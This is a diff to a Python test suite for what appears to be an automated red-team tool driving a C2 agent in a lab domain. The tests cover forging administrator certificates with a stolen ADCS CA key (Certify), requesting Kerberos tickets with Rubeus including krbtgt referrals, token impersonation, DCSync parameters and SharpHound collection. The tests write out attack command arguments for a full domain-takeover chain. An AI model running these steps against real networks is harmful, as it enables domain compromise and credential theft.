-    key, cert, cas = pkcs12.load_key_and_certificates(
-        calls["registered_contents"],
-        materialized["inputs"]["forged_pfx_password"].encode(),
-    )
-    assert key is not None
-    assert cert.subject.rfc4514_string() == "CN=administrator"
-    assert cas
+    assert calls["registered_filename"] == ca_artifact.name
+    assert calls["registered_contents"] == ca_artifact.read_bytes()
     assert calls["upload"] == {
         "command": "upload",
         "parameters": {
             "File": "file-uuid-1",
-            "Path": r"C:\Windows\Temp\sage_forged_cert_administrator_lab_local_13.pfx",
+            "Path": r"C:\Windows\Temp\sage_ca_signing_administrator_lab_local_13.pfx",
         },
         "file_uuid": "file-uuid-1",
         "callback_display_id": 13,
@@ -3922,22 +4514,20 @@ def test_materialize_capability_inputs_stages_adcs_certificate_then_builder_uses
         "shell",
         "shell",
         "execute_assembly",
+        "execute_assembly",
         "make_token",
         "ticket_store_add",
         "ticket_store_list",
         "shell",
     ]
-    pkinit = plan["commands"][2]
+    forge = plan["commands"][2]
+    assert forge["parameters"]["assembly_name"] == "Certify.exe"
+    assert "forge --ca-cert C:\\Windows\\Temp\\sage_ca_signing_administrator_lab_local_13.pfx" in forge["parameters"]["assembly_arguments"]
+    assert '--ca-pass "CA Secret!"' in forge["parameters"]["assembly_arguments"]
+    pkinit = plan["commands"][3]
     assert pkinit["parameters"]["assembly_name"] == "Rubeus.exe"
     assert "/certificate:C:\\Windows\\Temp\\sage_forged_cert_administrator_lab_local_13.pfx" in pkinit["parameters"]["assembly_arguments"]
     assert "/ptt" not in pkinit["parameters"]["assembly_arguments"]
-    assert all(
-        "ForgeCert.exe" != (
-            command.get("parameters", {}).get("assembly_name")
-            if isinstance(command.get("parameters"), dict) else ""
-        )
-        for command in plan["commands"]
-    )
 
 
 def test_resolve_domain_sid_falls_back_to_account_object_sid():
@@ -3967,12 +4557,9 @@ def test_resolve_domain_sid_falls_back_to_account_object_sid():
 
 
 def test_materialize_capability_inputs_embeds_resolved_administrator_sid(monkeypatch):
-    from cryptography.hazmat.primitives.serialization import pkcs12
-    from cryptography.x509.oid import ObjectIdentifier
-
     state_dir = Path(os.environ["SAGE_ENGAGEMENT_STATE_DIR"])
     artifact_dir = state_dir / "artifacts"
-    ca_artifact = _write_test_ca_artifact(artifact_dir / "adcs_ca_test_ca01_lab.local.pem.txt")
+    ca_artifact = _write_test_ca_pfx(artifact_dir / "adcs_ca_test_ca01_lab.local.pfx")
     engagement_ledger.save({
         "engagement_id": "test-op",
         "hops": [
@@ -4018,14 +4605,12 @@ def test_materialize_capability_inputs_embeds_resolved_administrator_sid(monkeyp
 
     assert materialized["ok"] is True
     assert materialized["inputs"]["account_sid"] == "S-1-5-21-111-222-333-500"
-    _key, cert, _cas = pkcs12.load_key_and_certificates(
-        calls["registered_contents"],
-        materialized["inputs"]["forged_pfx_password"].encode(),
-    )
-    extension = cert.extensions.get_extension_for_oid(
-        ObjectIdentifier("1.3.6.1.4.1.311.25.2")
-    ).value
-    assert b"S-1-5-21-111-222-333-500" in extension.value
+    assert calls["registered_contents"] == ca_artifact.read_bytes()
+    plan = json.loads(asyncio.run(mt.build_capability_commands(materialized["action"], materialized["inputs"])))
+    assert plan["ok"] is True
+    forge_step = plan["execution_plan"]["steps"][2]
+    assert forge_step["operation"] == "adcs-certificate-forge"
+    assert forge_step["parameters"]["account_sid"] == "S-1-5-21-111-222-333-500"
 
 
 def test_execute_capability_adcs_certificate_auth_requires_verified_ca_key_before_tasking(monkeypatch):
@@ -4094,7 +4679,8 @@ def test_execute_capability_adcs_certificate_auth_materializes_and_records(monke
                 "target_domain": "lab.local",
                 "account": "administrator",
                 "callback_id": "13",
-                "certificate_already_forged": True,
+                "ca_pfx_path": r"C:\Windows\Temp\sage_ca_signing_administrator_lab_local_13.pfx",
+                "ca_pfx_password": "SagePfx!administrator_lab_local_13",
                 "forged_pfx_path": r"C:\Windows\Temp\sage_forged_cert_administrator_lab_local_13.pfx",
                 "forged_pfx_password": "SageCert!administrator_lab_local_13",
                 "proof_host": "dc01.lab.local",
@@ -4114,6 +4700,7 @@ def test_execute_capability_adcs_certificate_auth_materializes_and_records(monke
     outputs = iter([
         "No tickets in current context.",
         "Access is denied.",
+        "Certify\nSaved forged certificate to 'C:\\Windows\\Temp\\sage_forged_cert_administrator_lab_local_13.pfx'.\n",
         f"[*] Action: Ask TGT\n[*] base64(ticket.kirbi):\n{ticket}\n",
         "Successfully impersonated local\\user for local access and lab.local\\administrator for remote access.",
         "Added Ticket to Ticket Store",
@@ -4137,17 +4724,20 @@ def test_execute_capability_adcs_certificate_auth_materializes_and_records(monke
     assert result["ok"] is True
     assert result["verdict"] == "achieved"
     assert materialize_calls["count"] == 1
-    assert calls["issue"] == 7
+    assert calls["issue"] == 8
     assert [item["command"] for item in result["issued"]] == [
         "shell",
         "shell",
+        "execute_assembly",
         "execute_assembly",
         "make_token",
         "ticket_store_add",
         "ticket_store_list",
         "shell",
     ]
-    pkinit_args = result["issued"][2]["parameters"]["assembly_arguments"]
+    forge_args = result["issued"][2]["parameters"]["assembly_arguments"]
+    assert "forge --ca-cert C:\\Windows\\Temp\\sage_ca_signing_administrator_lab_local_13.pfx" in forge_args
+    pkinit_args = result["issued"][3]["parameters"]["assembly_arguments"]
     assert "/certificate:C:\\Windows\\Temp\\sage_forged_cert_administrator_lab_local_13.pfx" in pkinit_args
     assert "/ptt" not in pkinit_args
     assert ticket not in json.dumps(result["issued"])
@@ -4157,7 +4747,18 @@ def test_execute_capability_adcs_certificate_auth_materializes_and_records(monke
     assert "certificate-auth:administrator@lab.local" in result["achieved_effects"]
 
 
-def test_execute_capability_adcs_certificate_auth_falls_back_to_schannel_when_pkinit_unsupported(monkeypatch):
+@pytest.mark.parametrize(
+    "pkinit_failure",
+    [
+        "[*] Action: Ask TGT\r\n[X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP\r\n",
+        "[*] Action: Ask TGT\r\n[X] KRB-ERROR (62) : KDC_ERR_CLIENT_NOT_TRUSTED\r\n",
+    ],
+    ids=["padata-not-supported", "client-not-trusted"],
+)
+def test_execute_capability_adcs_certificate_auth_falls_back_to_schannel_for_compatible_pkinit_errors(
+    monkeypatch,
+    pkinit_failure,
+):
     mt = _make_tools()
     mt._engagement_hops = [_proof_hop("adcs-ca-private-key:ca01@lab.local", 9000, callback_id="13")]
     mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
@@ -4212,7 +4813,7 @@ def test_execute_capability_adcs_certificate_auth_falls_back_to_schannel_when_pk
     outputs = iter([
         "No tickets in current context.",
         "Access is denied.",
-        "[*] Action: Ask TGT\r\n[X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP\r\n",
+        pkinit_failure,
         schannel_output,
     ])
     calls = {"issue": 0}
@@ -4240,127 +4841,19 @@ def test_execute_capability_adcs_certificate_auth_falls_back_to_schannel_when_pk
     assert "certificate-auth:administrator@lab.local" in result["achieved_effects"]
 
 
-def test_execute_capability_adcs_certificate_auth_runs_remote_schannel_when_local_ldaps_unavailable(monkeypatch, tmp_path):
+def test_adcs_certificate_auth_does_not_fallback_for_unrelated_pkinit_error():
     mt = _make_tools()
-    mt._engagement_hops = [
-        _proof_hop("adcs-ca-private-key:ca01@lab.local", 9000, callback_id="13"),
-        _proof_hop("remote-exec:ca01@lab.local", 9001, callback_id="13"),
-        _proof_hop("local-admin:ca01@lab.local", 9002, callback_id="13"),
-    ]
-    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
-    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
-    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="dc01.lab.local")
-    pfx_path = tmp_path / "forged-admin.pfx"
-    pfx_path.write_bytes(b"pfx-bytes")
 
-    async def fake_select(target_host, target_domain, local_account):
-        return {
-            "id": 91,
-            "account": local_account,
-            "realm": f"{target_host}.{target_domain}",
-            "credential": "CorrectHorseBatteryStaple!",
-        }
+    assert mt._capability_executor_pkinit_fallback_eligible(
+        "[X] KRB-ERROR (24) : KDC_ERR_PREAUTH_FAILED"
+    ) is False
 
-    async def fake_materialize(action, inputs=None):
-        return json.dumps({
-            "ok": True,
-            "capability": "adcs-certificate-auth",
-            "action": {
-                "name": "adcs-certificate-auth",
-                "target": "domain=lab.local;account=administrator;ca_host=ca01;callback=13",
-                "preconditions": ["adcs-ca-private-key:ca01@lab.local", "live-callback:13"],
-                "effects": ["da:lab.local", "certificate-auth:administrator@lab.local"],
-                "intent": {
-                    "capability": "adcs-certificate-auth",
-                    "domain": "lab.local",
-                    "account": "administrator",
-                    "callback_id": "13",
-                    "ca_host": "ca01",
-                },
-                "verifier": {},
-                "reason": "",
-                "source_facts": [],
-            },
-            "inputs": {
-                "domain": "lab.local",
-                "target_domain": "lab.local",
-                "account": "administrator",
-                "ca_host": "ca01",
-                "callback_id": "13",
-                "certificate_already_forged": True,
-                "forged_pfx_path": r"C:\Windows\Temp\sage_forged_cert_administrator_lab_local_13.pfx",
-                "forged_pfx_password": "SageCert!administrator_lab_local_13",
-                "proof_host": "dc01.lab.local",
-                "proof_resource": r"\\dc01.lab.local\C$",
-                "proof_marker": "SAGE_CERT_AUTH_PROOF_administrator_lab_local_13",
-            },
-            "evidence": {
-                "forged_pfx_artifact_path": str(pfx_path),
-            },
-        }, sort_keys=True)
 
-    monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)
-    monkeypatch.setattr(mt, "materialize_capability_inputs", fake_materialize)
-    remote_schannel_output = "\n".join([
-        "SAGE_CERT_AUTH_PROOF_administrator_lab_local_13",
-        "CERT_AUTH_METHOD=schannel-ldap",
-        "CERT_AUTH_DOMAIN=lab.local",
-        "CERT_AUTH_ACCOUNT=administrator",
-        "CERT_AUTH_LDAP_BIND=True",
-        "CERT_AUTH_USER_DN=CN=Administrator,CN=Users,DC=lab,DC=local",
-        "CERT_AUTH_MEMBER_OF=CN=Domain Admins,CN=Users,DC=lab,DC=local",
-        "CERT_AUTH_STATUS=OK",
-    ])
-    local_ldap_unavailable = "\n".join([
-        "SAGE_CERT_AUTH_PROOF_administrator_lab_local_13",
-        "CERT_AUTH_METHOD=schannel-ldap",
-        "CERT_AUTH_DOMAIN=lab.local",
-        "CERT_AUTH_ACCOUNT=administrator",
-        "CERT_AUTH_LDAP_BIND=False",
-        "CERT_AUTH_INNER_ERROR=The LDAP server is unavailable.",
-        "CERT_AUTH_STATUS=FAILED",
-    ])
-    outputs = iter([
-        "No tickets in current context.",
-        "Access is denied.",
-        "[*] Action: Ask TGT\r\n[X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP\r\n",
-        local_ldap_unavailable,
-        "Command executed successfully",
-        remote_schannel_output,
-    ])
-    calls = {"issue": 0}
-
-    with _split_issue(lambda: next(outputs), calls, display_id=9595):
-        result = json.loads(asyncio.run(mt.execute_capability(
-            {
-                "capability": "adcs-certificate-auth",
-                "domain": "lab.local",
-                "account": "administrator",
-                "ca_host": "ca01",
-                "callback_id": "13",
-            },
-            {"proof_host": "dc01.lab.local", "timeout": 5},
-        )))
-
-    assert result["ok"] is True, result
-    assert result["fallback"] == "remote-schannel-ldap"
-    assert result["stopped_after"] == "remote_schannel_ldap_fallback_verified_proof"
-    assert calls["issue"] == 6
-    assert [item["command"] for item in result["issued"]][-2:] == ["wmiexecute", "cat"]
-    remote = result["issued"][-2]
-    assert remote["parameters"]["host"] == "ca01.lab.local"
-    assert remote["parameters"]["username"] == "Administrator"
-    assert remote["parameters"]["password"] == "<secret>"
-    encoded = remote["parameters"]["command"].rsplit(" ", 1)[1]
-    remote_script = base64.b64decode(encoded).decode("utf-16le")
-    assert "$lines|Write-Output;return" not in remote_script
-    assert "throw 'CERT_AUTH_REMOTE_LDAP_BIND_FAILED'" in remote_script
-    assert "$base='DC=lab,DC=local'" in remote_script
-    assert result["issued"][-1]["parameters"] == {
-        "path": r"\\ca01.lab.local\C$\Windows\Temp\sage_cert_auth_administrator_lab_local_13_ca01.txt",
-    }
-    assert "da:lab.local" in result["recorded_effects"]
-    assert "certificate-auth:administrator@lab.local" in result["recorded_effects"]
+def test_adcs_certificate_auth_has_no_off_agent_schannel_fallback_surface():
+    mt = _make_tools()
+    assert not hasattr(mt, "_capability_executor_try_host_schannel_fallback")
+    assert not hasattr(mt, "_capability_executor_host_schannel_probe_sync")
+    assert not hasattr(mt, "_capability_executor_try_remote_schannel_fallback")
 
 
 def test_import_capability_credential_material_imports_adcs_certificate_auth_ntlm(monkeypatch):
@@ -4604,6 +5097,48 @@ def test_execute_capability_adcs_certificate_auth_records_failed_proof_without_a
     assert failed.status == "failed"
     assert failed.technique == "capability:adcs-certificate-auth"
     assert failed.evidence["terminal_failure"] is True
+    assert failed.evidence["failure_class"] == "genuine"
+
+
+def test_capability_executor_records_transient_failure_as_retryable():
+    mt = _make_tools()
+    action = capabilities.CapabilityAction(
+        name="adcs-certificate-auth",
+        target="domain=lab.local;account=administrator;ca_host=ca01;callback=13",
+        preconditions=[],
+        effects=["da:lab.local", "certificate-auth:administrator@lab.local"],
+        intent={"capability": "adcs-certificate-auth", "domain": "lab.local", "account": "administrator"},
+    )
+    payload = {
+        "ok": False,
+        "verdict": "failed",
+        "reason": "No answer from domain controller",
+        "transaction": {"status": "command_failed"},
+    }
+    issued = [{
+        "command": "execute_assembly",
+        "task_id": 56,
+        "result_class": "transient",
+        "_output": "Failed to get response from Domain Controller\nNo answer from domain controller",
+    }]
+
+    recorded = mt._capability_executor_record_failed_attempt(
+        payload,
+        action,
+        {"domain": "lab.local", "account": "administrator"},
+        "13",
+        issued,
+        {"callback_id": "13"},
+    )
+
+    assert recorded == ["certificate-auth:administrator@lab.local", "da:lab.local"]
+    assert payload["failure_class"] == "transient"
+    assert payload["retryable_failure"] is True
+    failed = mt._engagement_hops[-1]
+    assert failed.status == "failed"
+    assert failed.evidence["terminal_failure"] is False
+    assert failed.evidence["retryable_failure"] is True
+    assert mt._capability_failed_effects() == set()
 
 
 def test_execute_capability_output_preview_redacts_ticket_store_json():
@@ -4618,7 +5153,8 @@ def test_execute_capability_output_preview_redacts_ticket_store_json():
     assert "<kerberos_ticket_base64>" in preview or "<base64_blob>" in preview
 
 
-def test_kerberos_ticket_artifact_cache_binds_ticket_store_add():
+@pytest.mark.parametrize("command", ["ticket_store_add", "ticket_cache_add"])
+def test_kerberos_ticket_artifact_cache_binds_ticket_import_commands(command):
     mt = _make_tools()
     ticket = "A" * 88
     rubeus_output = f"""
@@ -4636,12 +5172,44 @@ def test_kerberos_ticket_artifact_cache_binds_ticket_store_add():
         rubeus_output,
     )
     bound = mt._bind_kerberos_ticket_artifact(
-        "ticket_store_add",
+        command,
         {"base64ticket": "not-valid-base64!", "existingTicket": {"credential": "not-valid-base64!"}},
     )
 
     assert bound["base64ticket"] == ticket
     assert bound["existingTicket"]["credential"] == ticket
+
+
+def test_kerberos_ticket_artifact_binds_inter_realm_referral_across_param_shapes():
+    # The inter-realm referral (asktgs) runs via execute_assembly; the captured ticket must be substituted into
+    # the `/ticket:{{kerberos_ticket_base64}}` placeholder REGARDLESS of how argument resolution shaped the
+    # params by issue time. The controller path delivers Apollo-native {Assembly, Arguments} keys (capitalized)
+    # or a JSON string — a fixed lowercase-key match silently no-ops on those and shipped Rubeus the literal
+    # placeholder live (KRBTGT_DUMPED wall stuck). All four shapes must substitute.
+    import json as _json
+
+    mt = _make_tools()
+    ticket = "Z" * 120
+    mt._capability_artifacts["kerberos_ticket_base64"] = ticket
+    args = "asktgs /ticket:{{kerberos_ticket_base64}} /service:krbtgt/parent.local /dc:dc01.child.local /nowrap"
+
+    shapes = [
+        {"assembly_name": "Rubeus.exe", "assembly_arguments": args},          # adapter lowercase keys
+        {"Assembly": "Rubeus.exe", "Arguments": args},                        # Apollo translated keys
+        _json.dumps({"assembly_name": "Rubeus.exe", "assembly_arguments": args}),
+        _json.dumps({"Assembly": "Rubeus.exe", "Arguments": args}),
+    ]
+    for params in shapes:
+        bound = mt._bind_kerberos_ticket_artifact("execute_assembly", params)
+        blob = bound if isinstance(bound, str) else _json.dumps(bound)
+        assert ticket in blob, f"ticket not substituted for shape {params!r}"
+        assert "{{kerberos_ticket_base64}}" not in blob, f"literal placeholder survived for {params!r}"
+
+    # An execute_assembly with no ticket placeholder is left untouched (no spurious substitution).
+    untouched = mt._bind_kerberos_ticket_artifact(
+        "execute_assembly", {"Assembly": "Rubeus.exe", "Arguments": "triage"}
+    )
+    assert untouched == {"Assembly": "Rubeus.exe", "Arguments": "triage"}
 
 
 def test_issue_task_refuses_duplicate_make_token_context():
@@ -5217,6 +5785,92 @@ def test_qualify_dcsync_params_qualifies_native_payload_schema():
         "user": "ESSOS\\krbtgt",
         "dc": "meereen.essos.local",
     }
+
+
+def test_normalize_sharphound_arguments_rewrites_space_separated_output_dir():
+    assert (
+        mythic_tools.normalize_sharphound_arguments(r"-c All -o C:\Users\Public")
+        == r"-c All --OutputDirectory C:\Users\Public"
+    )
+
+
+def test_normalize_sharphound_arguments_rewrites_equals_output_dir():
+    assert (
+        mythic_tools.normalize_sharphound_arguments(r"-c All -o=C:\Users\Public")
+        == r"-c All --OutputDirectory C:\Users\Public"
+    )
+
+
+def test_build_sharphound_arguments_uses_valid_long_form_defaults():
+    args = mythic_tools.build_sharphound_arguments()
+
+    assert "-c All" in args
+    assert "--CollectAllProperties" in args
+    assert "--OutputDirectory" in args
+    assert "--ZipFilename" in args
+    assert " -o " not in args
+
+
+def test_build_sharphound_arguments_parameterizes_output_and_zip_name():
+    args = mythic_tools.build_sharphound_arguments(r"C:\Temp", "out.zip")
+
+    assert r"--OutputDirectory C:\Temp" in args
+    assert "--ZipFilename out.zip" in args
+    assert "north" not in args.casefold()
+    assert "essos" not in args.casefold()
+    assert "sevenkingdoms" not in args.casefold()
+
+
+def test_build_sharphound_arguments_targets_external_domain_without_forcing_dc():
+    args = mythic_tools.build_sharphound_arguments(
+        r"C:\Temp",
+        "out.zip",
+        domain="target.example.local",
+    )
+
+    assert "--Domain target.example.local" in args
+    assert "--SearchForest" not in args
+    assert "--DomainController" not in args
+
+
+def test_build_sharphound_arguments_can_use_explicit_domain_controller():
+    args = mythic_tools.build_sharphound_arguments(
+        domain="target.example.local",
+        domain_controller="dc01.target.example.local",
+    )
+
+    assert "--Domain target.example.local" in args
+    assert "--DomainController dc01.target.example.local" in args
+
+
+def test_normalize_sharphound_arguments_noops_on_valid_args_and_is_idempotent():
+    args = r"-c All --CollectAllProperties --OutputDirectory C:\Users\Public --SearchForest"
+
+    assert mythic_tools.normalize_sharphound_arguments(args) == args
+    assert (
+        mythic_tools.normalize_sharphound_arguments(
+            mythic_tools.normalize_sharphound_arguments(args)
+        )
+        == args
+    )
+
+
+def test_normalize_sharphound_assembly_params_rewrites_dict_arguments():
+    mt = _make_tools()
+    params = {"assembly": "SharpHound.exe", "arguments": r"-c All -o C:\Users\Public"}
+
+    out = mt._normalize_sharphound_assembly_params("execute_assembly", params)
+
+    assert out["arguments"] == r"-c All --OutputDirectory C:\Users\Public"
+
+
+def test_normalize_sharphound_assembly_params_noops_for_other_commands_or_assemblies():
+    mt = _make_tools()
+    sharphound = {"assembly": "SharpHound.exe", "arguments": r"-c All -o C:\Users\Public"}
+    rubeus = {"assembly": "Rubeus.exe", "arguments": r"-c All -o C:\Users\Public"}
+
+    assert mt._normalize_sharphound_assembly_params("shell", sharphound) == sharphound
+    assert mt._normalize_sharphound_assembly_params("execute_assembly", rubeus) == rubeus
 
 
 def test_wait_for_seconds_is_bounded(monkeypatch):
